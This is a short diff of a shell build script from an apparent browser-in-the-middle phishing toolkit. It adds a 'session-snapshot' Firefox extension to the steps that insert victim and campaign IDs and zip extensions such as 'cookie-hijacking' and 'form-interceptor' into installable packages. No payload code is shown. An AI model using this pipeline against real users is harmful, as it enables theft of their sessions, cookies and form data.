@@ -76,6 +76,7 @@ sed -i "s|VICTIM_ID|$VICTIM_ID|g" /bitm/app/bad_firefox_extensions/site-info-hij
 
 sed -i "s|VICTIM_ID|$VICTIM_ID|g" /bitm/app/bad_firefox_extensions/form-interceptor/background.js
 sed -i "s|VICTIM_ID|$VICTIM_ID|g" /bitm/app/bad_firefox_extensions/cookie-hijacking/background.js
+sed -i "s|VICTIM_ID|$VICTIM_ID|g" /bitm/app/bad_firefox_extensions/session-snapshot/background.js
 
 sed -i "s|CAMPAIGN_IP|$IP|g" /etc/nginx/conf.d/local-proxy.conf
 sed -i "s|CAMPAIGN_ID|$CAMPAIGN_ID|g" /etc/nginx/conf.d/local-proxy.conf
@@ -88,6 +89,7 @@ cd /bitm/app/bad_firefox_extensions/disable-shortcuts/ && zip -r ../disable-shor
 cd /bitm/app/bad_firefox_extensions/site-info-hijacking/ && zip -r ../site-info-hijacking.xpi *
 cd /bitm/app/bad_firefox_extensions/form-interceptor/ && zip -r ../form-interceptor.xpi *
 cd /bitm/app/bad_firefox_extensions/cookie-hijacking/ && zip -r ../cookie-hijacking.xpi *
+cd /bitm/app/bad_firefox_extensions/session-snapshot/ && zip -r ../session-snapshot.xpi *
 
 # Select the debug-friendly policy in development/default mode while retaining
 # the hardened policy in kiosk mode. Then inject extensions as structured JSON.
